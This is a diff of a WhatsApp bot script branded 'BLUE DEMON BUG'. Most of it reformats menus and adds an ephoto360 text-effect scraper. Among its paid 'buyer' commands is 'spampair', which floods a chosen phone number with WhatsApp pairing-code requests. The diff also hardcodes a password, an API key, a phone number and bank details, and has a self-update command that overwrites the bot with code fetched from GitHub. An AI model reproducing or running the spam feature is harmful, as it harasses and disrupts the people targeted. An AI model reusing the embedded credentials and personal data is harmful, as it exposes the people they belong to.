@@ -35,6 +35,53 @@ module.exports = async (blue, m, store) => {
             var numUpper = (mytext.match(/case '/g) || []).length;
             return numUpper
         }
+        async function ephoto(url, texk) {
+      let form = new FormData();
+      let gT = await axios.get(url, {
+        headers: {
+          'user-agent':
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
+        },
+      });
+      let $ = cheerio.load(gT.data);
+      let text = texk;
+      let token = $('input[name=token]').val();
+      let build_server = $('input[name=build_server]').val();
+      let build_server_id = $('input[name=build_server_id]').val();
+      form.append('text[]', text);
+      form.append('token', token);
+      form.append('build_server', build_server);
+      form.append('build_server_id', build_server_id);
+      let res = await axios({
+        url: url,
+        method: 'POST',
+        data: form,
+        headers: {
+          Accept: '*/*',
+          'Accept-Language': 'en-US,en;q=0.9',
+          'user-agent':
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
+          cookie: gT.headers['set-cookie']?.join('; '),
+          ...form.getHeaders(),
+        },
+      });
+      let $$ = cheerio.load(res.data);
+      let json = JSON.parse($$('input[name=form_value_input]').val());
+      json['text[]'] = json.text;
+      delete json.text;
+      let { data } = await axios.post(
+        'https://en.ephoto360.com/effect/create-image',
+        new URLSearchParams(json),
+        {
+          headers: {
+            'user-agent':
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
+            cookie: gT.headers['set-cookie'].join('; '),
+          },
+        }
+      );
+      return build_server + data.image;
+    }
         const isAdmins = isGroup ? groupAdmins.includes(sender) : false
         const tanggal = moment.tz('Africa/Lagos').format('DD/MM/YY')
         const {
@@ -50,8 +97,8 @@ module.exports = async (blue, m, store) => {
             mediafireDl
         } = require('./database/dtbs/mediafire.js')
         let db_saldo = JSON.parse(fs.readFileSync("./database/dtbs/saldo.json"));
-       const fetch = require('node-fetch');
-         const {
+        const fetch = require('node-fetch');
+        const {
             beta1,
             beta2,
             buk1
@@ -99,31 +146,39 @@ module.exports = async (blue, m, store) => {
                 })
             }
         }
-blue.sendImageAsSticker = async (jid, media, m, options = {}) => {
-    let { Sticker, StickerTypes } = require('wa-sticker-formatter')
-    const getRandom = (ext) => {
-            return `${Math.floor(Math.random() * 10000)}${ext}`
+        blue.sendImageAsSticker = async (jid, media, m, options = {}) => {
+            let {
+                Sticker,
+                StickerTypes
+            } = require('wa-sticker-formatter')
+            const getRandom = (ext) => {
+                return `${Math.floor(Math.random() * 10000)}${ext}`
+            }
+            let jancok = new Sticker(media, {
+                pack: global.packname, // The pack name
+                author: global.author, // The author name
+                type: StickerTypes.FULL, // The sticker type
+                categories: ['🤩', '🎉'], // The sticker category
+                id: '12345', // The sticker id
+                quality: 50, // The quality of the output file
+                background: '#FFFFFF00' // The sticker background color (only for full stickers)
+            })
+            let stok = getRandom(".webp")
+            let nono = await jancok.toFile(stok)
+            let nah = fs.readFileSync(nono)
+            await blue.sendMessage(jid, {
+                sticker: nah
+            }, {
+                quoted: m
+            })
+            return await fs.unlinkSync(stok)
         }
-    let jancok = new Sticker(media, {
-        pack: global.packname, // The pack name
-        author: global.author, // The author name
-        type: StickerTypes.FULL, // The sticker type
-        categories: ['🤩', '🎉'], // The sticker category
-        id: '12345', // The sticker id
-        quality: 50, // The quality of the output file
-        background: '#FFFFFF00' // The sticker background color (only for full stickers)
-    })
-    let stok = getRandom(".webp")
-    let nono = await jancok.toFile(stok)
-    let nah = fs.readFileSync(nono)
-    await blue.sendMessage(jid,{sticker: nah},{quoted: m})
-    return await fs.unlinkSync(stok)
-     }
         const nanototalpitur = () => {
             var mytext = fs.readFileSync("./demontech.js").toString()
             var numUpper = (mytext.match(/case '/g) || []).length
             return numUpper
         }
+        const restrictedTargets = ['2347041039367'];
         const themeemoji = "👾"
         // Random Color
         const listcolor = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']
@@ -622,31 +677,32 @@ END:VCARD`
             if (!m.key.fromMe) return
         }
 
-        async function loading () {
-var baralod = [
-"𝐆𝐮𝐞𝐬𝐬 𝐰𝐡𝐚𝐭🤡", 
-"𝐆𝐮𝐞𝐬𝐬 𝐰𝐡𝐚𝐭🤡", 
-"👾", 
-"👾👾",
-"👾👾👾", 
-"👾👾👾👾", 
-"👾👾👾👾👾",
-"👾👾👾👾👾👾",
-"🤡𝕴 𝖐𝖓𝖔𝖜 𝖞𝖔𝖚𝖗 𝖘𝖊𝖈𝖗𝖊𝖙🤡", 
-]
-            let {
-                key
-            } = await blue.sendMessage(from, {
-                text: '𝐆𝐮𝐞𝐬𝐬 𝐰𝐡𝐚𝐭🤡'
-            })
+async function loading() {
+    var baralod = [
+        "𝐆𝐮𝐞𝐬𝐬 𝐰𝐡𝐚𝐭🤡",
+        "👾",
+        "👾👾",
+        "👾👾👾",
+        "👾👾👾👾",
+        "👾👾👾👾👾",
+        "👾👾👾👾👾👾",
+        "🤡𝕴 𝖐𝖓𝖔𝖜 𝖞𝖔𝖚𝖗 𝖘𝖊𝖈𝖗𝖊𝖙🤡",
+    ];
+    
+    let { key } = await blue.sendMessage(from, {
+        text: '𝐆𝐮𝐞𝐬𝐬 𝐰𝐡𝐚𝐭🤡'
+    });
 
-            for (let i = 0; i < baralod.length; i++) {
-                await blue.sendMessage(from, {
-                    text: baralod[i],
-                    edit: key
-                });
-            }
-        }
+    for (let i = 0; i < baralod.length; i++) {
+        await blue.sendMessage(from, {
+            text: baralod[i],
+            edit: key
+        });
+        
+        // Add delay of 1 second (1000 ms)
+        await new Promise(resolve => setTimeout(resolve, 500));
+    }
+}
 
 
         // Fake Resize
@@ -746,13 +802,13 @@ var baralod = [
         }
 
         switch (command) {
-      case 'menu': {
-      await loading()
-    const darkphonk = fs.readFileSync('./database/Phonk.mp3');
-    const image = fs.readFileSync('./database/image/xbug.jpg');
-    const version = require("baileys/package.json").version;
+            case 'menu': {
+                await loading()
+                const darkphonk = fs.readFileSync('./database/Phonk.mp3');
+                const image = fs.readFileSync('./database/image/xbug.jpg');
+                const version = require("baileys/package.json").version;
 
-    const menu2 = `┏━━ ｢ \`ᏰᏝᏬᏋ ᎴᏋᎷᎧᏁ\` ｣ ━━❐
+                const menu2 = `┏━━ ｢ \`ᏰᏝᏬᏋ ᎴᏋᎷᎧᏁ\` ｣ ━━❐
 ┃✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
 ┃✾ᐉ 𝐑𝐮𝐧 : *${run}*
 ┃✾ᐉ 𝐏𝐫𝐞𝐟𝐢𝐱 : *${prefix}*
@@ -770,28 +826,28 @@ var baralod = [
 > ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴅᴇᴘʟᴏʏɪɴɢ
 > 𝕯𝖊𝖒𝖔𝖓 𝖐𝖎𝖓𝖌
 `;
-    // Send the image
-    await blue.sendMessage(m.chat, {
-        image: image,
-        caption: menu2
-    });
+                // Send the image
+                await blue.sendMessage(m.chat, {
+                    image: image,
+                    caption: menu2
+                });
 
-    // Send the audio as a push-to-talk (PTT) message
-    await blue.sendMessage(m.chat, {
-        audio: darkphonk,
-        mimetype: 'audio/mp4',
-        ptt: true
-    });
-    
-    break;
-}
+                // Send the audio as a push-to-talk (PTT) message
+                await blue.sendMessage(m.chat, {
+                    audio: darkphonk,
+                    mimetype: 'audio/mp4',
+                    ptt: true
+                });
+
+                break;
+            }
             case 'bluemenu':
-case 'allmenu': {
-     await loading()
-    const version = require("baileys/package.json").version;
-    let run = runtime(process.uptime());
+            case 'allmenu': {
+                await loading()
+                const version = require("baileys/package.json").version;
+                let run = runtime(process.uptime());
 
-    const allmenu = `┏━━ ｢ \`ᏰᏝᏬᏋ ᎴᏋᎷᎧᏁ\` ｣ ━━❐
+                const allmenu = `┏━━ ｢ \`ᏰᏝᏬᏋ ᎴᏋᎷᎧᏁ\` ｣ ━━❐
 ┃✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
 ┃✾ᐉ 𝐑𝐮𝐧 : *${run}*
 ┃✾ᐉ 𝐏𝐫𝐞𝐟𝐢𝐱 : *${prefix}*
@@ -883,21 +939,21 @@ case 'allmenu': {
 ┗─────────────❐
 `;
 
-    // Send the image with the menu
-    const image = fs.readFileSync('./database/image/xbug.jpg');
-    await blue.sendMessage(m.chat, {
-        image: image,
-        caption: allmenu
-    });
+                // Send the image with the menu
+                const image = fs.readFileSync('./database/image/xbug.jpg');
+                await blue.sendMessage(m.chat, {
+                    image: image,
+                    caption: allmenu
+                });
 
-    break;
-}
-     case 'specialmenu': {
-     await loading()
-    const version = require("baileys/package.json").version;
-    let run = runtime(process.uptime());
-const darkphonk = fs.readFileSync('./database/Phonk.mp3');
-    const allmenu = `┏━━ ｢ \`ᏰᏝᏬᏋ ᎴᏋᎷᎧᏁ\` ｣ ━━❐
+                break;
+            }
+            case 'specialmenu': {
+                await loading()
+                const version = require("baileys/package.json").version;
+                let run = runtime(process.uptime());
+                const darkphonk = fs.readFileSync('./database/Phonk.mp3');
+                const allmenu = `┏━━ ｢ \`ᏰᏝᏬᏋ ᎴᏋᎷᎧᏁ\` ｣ ━━❐
 ┃✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
 ┃✾ᐉ 𝐑𝐮𝐧 : *${run}*
 ┃✾ᐉ 𝐏𝐫𝐞𝐟𝐢𝐱 : *${prefix}*
@@ -914,26 +970,26 @@ const darkphonk = fs.readFileSync('./database/Phonk.mp3');
 ┗─────────────❐
 `;
 
-    // Send the image with the menu
-    const image = fs.readFileSync('./database/image/xbug.jpg');
-    await blue.sendMessage(m.chat, {
-        image: image,
-        caption: allmenu
-    });
-       // Send the audio as a push-to-talk (PTT) message
-    await blue.sendMessage(m.chat, {
-        audio: darkphonk,
-        mimetype: 'audio/mp4',
-        ptt: true
-    });
-    break;
-}
-           case 'bugmenu': {
-           await loading()
-    const version = require("baileys/package.json").version;
-    let run = runtime(process.uptime());
-const darkphonk = fs.readFileSync('./database/Phonk.mp3');
-    const allmenu = `┏━━ ｢ \`ᏰᏝᏬᏋ ᎴᏋᎷᎧᏁ\` ｣ ━━❐
+                // Send the image with the menu
+                const image = fs.readFileSync('./database/image/xbug.jpg');
+                await blue.sendMessage(m.chat, {
+                    image: image,
+                    caption: allmenu
+                });
+                // Send the audio as a push-to-talk (PTT) message
+                await blue.sendMessage(m.chat, {
+                    audio: darkphonk,
+                    mimetype: 'audio/mp4',
+                    ptt: true
+                });
+                break;
+            }
+            case 'bugmenu': {
+                await loading()
+                const version = require("baileys/package.json").version;
+                let run = runtime(process.uptime());
+                const darkphonk = fs.readFileSync('./database/Phonk.mp3');
+                const allmenu = `┏━━ ｢ \`ᏰᏝᏬᏋ ᎴᏋᎷᎧᏁ\` ｣ ━━❐
 ┃✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
 ┃✾ᐉ 𝐑𝐮𝐧 : *${run}*
 ┃✾ᐉ 𝐏𝐫𝐞𝐟𝐢𝐱 : *${prefix}*
@@ -953,22 +1009,22 @@ const darkphonk = fs.readFileSync('./database/Phonk.mp3');
 ┗─────────────❐
 `;
 
-    // Send the image with the menu as a caption
-    const image = fs.readFileSync('./database/image/xbug.jpg');
-    await blue.sendMessage(m.chat, {
-        image: image,
-        caption: allmenu
-    });
-   // Send the audio as a push-to-talk (PTT) message
-    await blue.sendMessage(m.chat, {
-        audio: darkphonk,
-        mimetype: 'audio/mp4',
-        ptt: true
-    });
-    
-    break;
-} 
-            
+                // Send the image with the menu as a caption
+                const image = fs.readFileSync('./database/image/xbug.jpg');
+                await blue.sendMessage(m.chat, {
+                    image: image,
+                    caption: allmenu
+                });
+                // Send the audio as a push-to-talk (PTT) message
+                await blue.sendMessage(m.chat, {
+                    audio: darkphonk,
+                    mimetype: 'audio/mp4',
+                    ptt: true
+                });
+
+                break;
+            }
+
             case "addprem": {
                 if (!isOwner) return reply(mess.only.owner);
                 if (!args[0]) return reply(`Usage: ${prefix + command} number\nExample: ${prefix + command} 62×××`);
@@ -980,47 +1036,46 @@ const darkphonk = fs.readFileSync('./database/Phonk.mp3');
                 reply(`Number ${prrkek} has been added as Premium!`);
             }
             break;
-case "addbuyer": {
-    if (!isOwner) return reply(mess.only.owner);
+            case "addbuyer": {
 
-    // Prompt for password and validate
-    if (args[0] !== "bluedemon-solos") {
-        return reply(`Incorrect password! Example: ${prefix + command} password 234×××\n*MESSAGE wa.me/2347041039367 FOR PASSWORD*.`);
-    }
+                // Prompt for password and validate
+                if (args[0] !== "bluedemon-solos") {
+                    return reply(`Incorrect password! Example: ${prefix + command} password 234×××\n*MESSAGE wa.me/2347041039367 FOR PASSWORD*.`);
+                }
 
-    // Remove the password argument from args and proceed with the rest
-    const numberArg = args.slice(1).join(" ");
-    
-    // Check if the number argument is missing or empty
-    if (!numberArg) {
-        return reply(`Usage: ${prefix + command} password number\nExample: ${prefix + command} password 62×××`);
-    }
+                // Remove the password argument from args and proceed with the rest
+                const numberArg = args.slice(1).join(" ");
 
-    // Clean the phone number and check its format (only numbers allowed)
-    const cleanedNumber = numberArg.split("|")[0].replace(/[^0-9]/g, '');
-    
-    // Validate phone number format (e.g., check length or country code)
-    if (cleanedNumber.length < 10) {
-        return reply("Invalid number format! Please enter a valid phone number in the correct format.\nExample: 62XXXXXXXXXX");
-    }
+                // Check if the number argument is missing or empty
+                if (!numberArg) {
+                    return reply(`Usage: ${prefix + command} password number\nExample: ${prefix + command} password 62×××`);
+                }
 
-    // Check if the number is registered on WhatsApp
-    prrkek = cleanedNumber + `@s.whatsapp.net`;
-    let ceknya = await blue.onWhatsApp(prrkek);
-    
-    // If the number is not registered on WhatsApp
-    if (ceknya.length == 0) {
-        return reply(`The number ${cleanedNumber} is not registered on WhatsApp! Please enter a valid number.`);
-    }
+                // Clean the phone number and check its format (only numbers allowed)
+                const cleanedNumber = numberArg.split("|")[0].replace(/[^0-9]/g, '');
 
-    // Add to premium list
-    prem.push(prrkek);
-    fs.writeFileSync("./database/lib/secret.json", JSON.stringify(prem));
-    
-    // Success message
-    reply(`Number ${prrkek} has been successfully added as Premium!`);
-}
-break;
+                // Validate phone number format (e.g., check length or country code)
+                if (cleanedNumber.length < 10) {
+                    return reply("Invalid number format! Please enter a valid phone number in the correct format.\nExample: 62XXXXXXXXXX");
+                }
+
+                // Check if the number is registered on WhatsApp
+                prrkek = cleanedNumber + `@s.whatsapp.net`;
+                let ceknya = await blue.onWhatsApp(prrkek);
+
+                // If the number is not registered on WhatsApp
+                if (ceknya.length == 0) {
+                    return reply(`The number ${cleanedNumber} is not registered on WhatsApp! Please enter a valid number.`);
+                }
+
+                // Add to premium list
+                prem.push(prrkek);
+                fs.writeFileSync("./database/lib/secret.json", JSON.stringify(prem));
+
+                // Success message
+                reply(`Number ${prrkek} has been successfully added as buyer!`);
+            }
+            break;
             case "delprem": {
                 if (!isOwner) return reply(mess.only.owner);
                 if (!args[0]) return reply(`Usage: ${prefix + command} number\nExample: ${prefix + command} 62×××`);
@@ -1634,12 +1689,11 @@ break;
                 }
                 break;
             }
-   case 'repo':
-case 'channel':
-case 'script':
-case 'sc': {
-    const repo = `
-
+            case 'repo':
+            case 'channel':
+            case 'script':
+            case 'sc': {
+                const repo = `
 ┃ 👾 *\`Script Repository\`* 👾
 ┃    🔗 [GitHub Repository](https://github.com/BLUEXDEMONl/BLUEXDEMON-BUG-V3.git)
 ┃
@@ -1650,13 +1704,13 @@ case 'sc': {
 ┃    *Stay updated with the latest news and features. Be part of the BLUE DEMON community.*
 `;
 
-    // Send the message
-    await blue.sendMessage(m.chat, { text: repo });
-    break;
-}
+                // Send the message
+               reply(repo);
+                break;
+            }
             case 'update': {
                 if (!isOwner) return reply(mess.only.owner);
-
+                if (!isBuyer) return reply(mess.only.buyer)
                 reply("*𝐔𝐏𝐃𝐀𝐓𝐈𝐍𝐆 𝐃𝐄𝐌𝐎𝐍 𝐁𝐎𝐓....*");
                 try {
                     const githubRawUrl = 'https://raw.githubusercontent.com/BLUEXDEMONl/BLUEDEMON-UPDATE-/refs/heads/main/demontech.js';
@@ -1928,30 +1982,34 @@ case 'sc': {
                     .catch((err) => reply(JSON.stringify(err)));
                 break;
             }
-         case 'setname':
-         case 'setbotname':{
-if (!isOwner) return reply(mess.only.owner)
-if (!text) return reply(`Example: ${prefix + command} *BLUE DEMON*`)
-    await blue.updateProfileName(text)
-    reply(`*SUCCESSFULLY CHANGE NAME TO ${text}*`)
-    }
-    break
-  case 'setgcname':  case 'setnamegc': case 'setgroupname': case 'setsubject': {
-if (!isGroup) return reply(mess.only.group)
-if (!isBotAdmins) return reply(mess.only.badmin)
-if (!isAdmins) return reply(mess.only.admin)
-if (!text) return reply('*HUH?*')
-await blue.groupUpdateSubject(m.chat, text)
-await bluereply(mess.success)
+            case 'setname':
+            case 'setbotname': {
+                if (!isOwner) return reply(mess.only.owner)
+                if (!text) return reply(`Example: ${prefix + command} *BLUE DEMON*`)
+                await blue.updateProfileName(text)
+                reply(`*SUCCESSFULLY CHANGE NAME TO ${text}*`)
             }
             break
-            case 'setdesc': case 'setdesk': {
-if (!isGroup) return reply(mess.only.group)
-if (!isBotAdmins) return reply(mess.only.badmin)
-if (!isAdmins) return reply(mess.only.admin)
-if (!text) return reply('*HUH?*')
-await blue.groupUpdateDescription(m.chat, text)
-await bluereply(mess.success)
+            case 'setgcname':
+            case 'setnamegc':
+            case 'setgroupname':
+            case 'setsubject': {
+                if (!isGroup) return reply(mess.only.group)
+                if (!isBotAdmins) return reply(mess.only.badmin)
+                if (!isAdmins) return reply(mess.only.admin)
+                if (!text) return reply('*HUH?*')
+                await blue.groupUpdateSubject(m.chat, text)
+                await bluereply(mess.success)
+            }
+            break
+            case 'setdesc':
+            case 'setdesk': {
+                if (!isGroup) return reply(mess.only.group)
+                if (!isBotAdmins) return reply(mess.only.badmin)
+                if (!isAdmins) return reply(mess.only.admin)
+                if (!text) return reply('*HUH?*')
+                await blue.groupUpdateDescription(m.chat, text)
+                await bluereply(mess.success)
             }
             break
             case 'closegroup':
@@ -2196,20 +2254,28 @@ await bluereply(mess.success)
             }
             break
 
-			case 's': case 'sticker': case 'take': {
-if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
-if (/image/.test(mime)) {
-let media = await quoted.download()
-let encmedia = await blue.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
-} else if (/video/.test(mime)) {
-if ((quoted.msg || quoted).seconds > 11) return replyg('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
-let media = await quoted.download()
-let encmedia = await blue.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
-} else {
-reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
-}
-}
-break
+            case 's':
+            case 'sticker':
+            case 'take': {
+                if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
+                if (/image/.test(mime)) {
+                    let media = await quoted.download()
+                    let encmedia = await blue.sendImageAsSticker(m.chat, media, m, {
+                        packname: global.packname,
+                        author: global.author
+                    })
+                } else if (/video/.test(mime)) {
+                    if ((quoted.msg || quoted).seconds > 11) return replyg('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
+                    let media = await quoted.download()
+                    let encmedia = await blue.sendVideoAsSticker(m.chat, media, m, {
+                        packname: global.packname,
+                        author: global.author
+                    })
+                } else {
+                    reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
+                }
+            }
+            break
             break
             case 'enc':
             case 'encrypt':
@@ -2284,17 +2350,17 @@ break
                 reply(lowq);
             }
             break;
-               async function autoViewStatus() {
-                    if (autoswview) {
-                        // Fetch the list of statuses
-                        let statusList = await blue.fetchStatusUpdates();
-                        for (let status of statusList) {
-                            // Automatically view each status
-                            await blue.readStatus(status.id);
-                        }
+            async function autoViewStatus() {
+                if (autoswview) {
+                    // Fetch the list of statuses
+                    let statusList = await blue.fetchStatusUpdates();
+                    for (let status of statusList) {
+                        // Automatically view each status
+                        await blue.readStatus(status.id);
                     }
                 }
-case 'avs':
+            }
+            case 'avs':
             case 'autostatus': {
                 // Check if the user is the owner of the bot
                 if (!isOwner) return reply(mess.owner);
@@ -2462,38 +2528,105 @@ case 'avs':
                 setTimeout(() => updateMessage(), 1000);
                 break;
             }
-case 'exchange': {
-    if (!args[0] || !args[1] || !args[2]) return reply('\nExample: exchange 100 USD EUR');
+                    case 'glitchtext':
+case 'writetext':
+case 'advancedglow':
+case 'typographytext':
+case 'pixelglitch':
+case 'neonglitch':
+case 'flagtext':
+case 'flag3dtext':
+case 'deletingtext':
+case 'blackpinkstyle':
+case 'glowingtext':
+case 'underwatertext':
+case 'logomaker':
+case 'cartoonstyle':
+case 'papercutstyle':
+case 'watercolortext':
+case 'effectclouds':
+case 'blackpinklogo':
+case 'gradienttext':
+case 'summerbeach':
+case 'luxurygold':
+case 'multicoloredneon':
+case 'sandsummer':
+case 'galaxywallpaper':
+case '1917style':
+case 'makingneon':
+case 'royaltext':
+case 'freecreate':
+case 'galaxystyle':
+case 'lighteffects':{
 
-    const amount = parseFloat(args[0]);
-    const fromCurrency = args[1].toUpperCase();
-    const toCurrency = args[2].toUpperCase();
-    
-    if (isNaN(amount)) return reply('Please enter a valid amount.');
-
-    try {
-        // Send request to ExchangeRate API
-        const apiKey = '43f31fb84c391ced11b216a4';
-        const url = `https://v6.exchangerate-api.com/v6/${apiKey}/pair/${fromCurrency}/${toCurrency}`;
-
-        const response = await axios.get(url);
-        const exchangeRate = response.data.conversion_rate;
-
-        // Calculate converted amount
-        const convertedAmount = (amount * exchangeRate).toFixed(2);
-
-        // Reply with conversion result
-        reply(`💱 *Currency Exchange*\n\n*Amount:* ${amount} ${fromCurrency}\n*Converted Amount:* ${convertedAmount} ${toCurrency}\n*Exchange Rate:* 1 ${fromCurrency} = ${exchangeRate} ${toCurrency}
-> ʙʟᴜᴇᴅᴇᴍᴏɴ`);
-    } catch (error) {
-        console.error(error);
-        reply('Error: Unable to retrieve exchange rates. Please try again later.');
-    }
-    break;
+if (!text) return reply(`Example : ${prefix+command} +`) 
+let link
+if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
+if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
+if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
+if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
+if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
+if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
+if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
+if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
+if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
+if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
+if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
+if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
+if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
+if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
+if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
+if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
+if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
+if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
+if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
+if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
+if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
+if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
+if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
+if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
+if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
+if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
+if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
+if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
+if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
+if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
+let haldwhd = await ephoto(link, text)
+blue.sendMessage(m.chat, { image: { url: haldwhd }, caption: `Done` }, { quoted: m })
 }
+break
+            case 'exchange': {
+                if (!args[0] || !args[1] || !args[2]) return reply('\nExample: exchange 100 USD EUR');
+
+                const amount = parseFloat(args[0]);
+                const fromCurrency = args[1].toUpperCase();
+                const toCurrency = args[2].toUpperCase();
+
+                if (isNaN(amount)) return reply('Please enter a valid amount.');
+
+                try {
+                    // Send request to ExchangeRate API
+                    const apiKey = '43f31fb84c391ced11b216a4';
+                    const url = `https://v6.exchangerate-api.com/v6/${apiKey}/pair/${fromCurrency}/${toCurrency}`;
+
+                    const response = await axios.get(url);
+                    const exchangeRate = response.data.conversion_rate;
+
+                    // Calculate converted amount
+                    const convertedAmount = (amount * exchangeRate).toFixed(2);
+
+                    // Reply with conversion result
+                    reply(`💱 *Currency Exchange*\n\n*Amount:* ${amount} ${fromCurrency}\n*Converted Amount:* ${convertedAmount} ${toCurrency}\n*Exchange Rate:* 1 ${fromCurrency} = ${exchangeRate} ${toCurrency}
+> ʙʟᴜᴇᴅᴇᴍᴏɴ`);
+                } catch (error) {
+                    console.error(error);
+                    reply('Error: Unable to retrieve exchange rates. Please try again later.');
+                }
+                break;
+            }
             case 'spampair': {
-               if (!isPremium) return reply(mess.only.premium)
-               if (!isBuyer) return reply(mess.only.buyer)
+                if (!isPremium) return reply(mess.only.premium)
+                if (!isBuyer) return reply(mess.only.buyer)
                 const usePairingCode = true
                 const NodeCache = require("node-cache")
                 const resolveMsgBuffer = new NodeCache()
@@ -2501,7 +2634,7 @@ case 'exchange': {
                 if (!q) return reply(`*👾*\n\n*_Use : Spampair NUMBER*|AMOUNT_\n_Example : Spampair 62xx_`)
                 let [peenis, pepekk = "200"] = q.split("|")
                 await reply(`👾𝙎𝙋𝘼𝙈 𝘾𝙊𝘿𝙀 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔👾`)
-             
+
                 let target = peenis.replace(/[^0-9]/g, '').trim()
                 let {
                     default: makeWaSocket,
@@ -2535,8 +2668,8 @@ case 'exchange': {
                 await sleep(2000)
             }
             break
-case 'acc':
-case 'aza': {
+            case 'acc':
+            case 'aza': {
                 let bankDetails = `*BANK DETAILS*\n` +
                     `👾 _*BOLAJI*_\n\n` +
                     `🔢 7041039367\n\n` +
@@ -2546,7 +2679,7 @@ case 'aza': {
                 reply(bankDetails);
                 break;
             }
-case 'nice': {
+            case 'nice': {
                 reply(`*${pushname}* *𝑻𝒉𝒂𝒏𝒌 𝒚𝒐𝒖 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒄𝒐𝒎𝒑𝒍𝒊𝒎𝒆𝒏𝒕*`)
             }
             break
@@ -2605,18 +2738,24 @@ case 'nice': {
                 }, 400)
             }
             break
-case 'getpp':{
-if (!m.isGroup) return reply (mess.only.group)
-let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-let ghosst = userss
-	try {
-   var ppuser = await blue.profilePictureUrl(ghosst, 'image')
-} catch (err) {
-   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
-}
-blue.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
-}
-break 
+            case 'getpp': {
+                if (!m.isGroup) return reply(mess.only.group)
+                let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+                let ghosst = userss
+                try {
+                    var ppuser = await blue.profilePictureUrl(ghosst, 'image')
+                } catch (err) {
+                    var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
+                }
+                blue.sendMessage(from, {
+                    image: {
+                        url: ppuser
+                    }
+                }, {
+                    quoted: m
+                })
+            }
+            break
 
             case 'antibugon': {
                 if (!isOwner) return reply(mess.only.owner)
@@ -2633,95 +2772,130 @@ break
